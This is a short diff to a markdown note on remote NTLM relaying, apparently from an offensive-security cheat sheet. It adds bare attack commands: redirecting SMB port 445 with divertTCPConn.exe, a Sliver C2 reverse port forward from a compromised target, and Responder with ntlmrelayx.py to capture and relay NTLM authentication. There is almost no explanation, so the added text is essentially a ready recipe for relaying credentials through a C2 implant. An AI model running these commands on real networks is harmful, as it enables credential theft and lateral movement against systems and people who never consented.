@@ -1,5 +1,21 @@
 # Remote NTLM Relaying
 
+```
+divertTCPConn.exe 445 8445
+```
+
+## Sliver C2
+
+```
+rportfwd add -r 127.0.0.1:445 -b <compromised_target_IP>:8445
+```
+
+```
+$ sudo responder -I lo
+
+$ sudo ntlmrelayx.py -ip 127.0.0.1
+```
+
 ---
 ## References
 
